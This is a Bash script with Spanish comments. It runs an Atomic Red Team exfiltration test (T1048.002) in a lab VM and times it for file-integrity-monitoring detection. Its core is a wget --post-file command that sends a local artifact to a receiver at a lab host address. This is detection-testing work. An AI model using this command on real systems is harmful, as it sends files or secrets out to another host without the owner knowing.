#!/usr/bin/env bash
# ============================================================================
# ATA008 · T1048.002 Exfiltration Over Alternative Protocol — atómica wget
# GUID   : 7ccdfcfa-6707-46bc-b812-007ab6ff951c
# Fuente : atomic-red-team (commit 388942adbd9641f4dfdcf079d7efe9a75ec0ac43)
# Path   : atomics/T1048.002/T1048.002.yaml
# ----------------------------------------------------------------------------
# Exfiltra un fichero por HTTP al receptor del HOST (sobremesa) en VMnet1.
# Ejecuta el cuerpo de la atómica PARAMETRIZADO y SIN elevación (usuario angel).
#
# ⚠️ El receptor (Soporte/Ataques/receiver/sink_http.py) debe estar LEVANTADO en
#    el HOST antes de t0. Endpoint fijado en el paso 0: http://192.168.65.1:9090/
#
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC). t1 OFICIAL tras el scan FIM.
# ============================================================================
set -u

INPUT="${HOME}/lab-attack/ATA008/src/artifact"
ENDPOINT="http://192.168.65.1:9090/"

echo "ATA008 · T1048.002 Exfiltration Over Alternative Protocol (wget) — GUID 7ccdfcfa-6707-46bc-b812-007ab6ff951c"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

if [ ! -f "$INPUT" ]; then
  echo "ERROR: falta $INPUT (¿scp del directorio de la técnica?)" >&2
  exit 1
fi
if ! command -v wget >/dev/null 2>&1; then
  echo "ERROR: wget no disponible" >&2
  exit 1
fi

# Cuerpo de la atómica parametrizado (--post-file = contenido del fichero en el POST):
wget --post-file="$INPUT" --timeout=5 --no-check-certificate "$ENDPOINT" --delete-after

echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
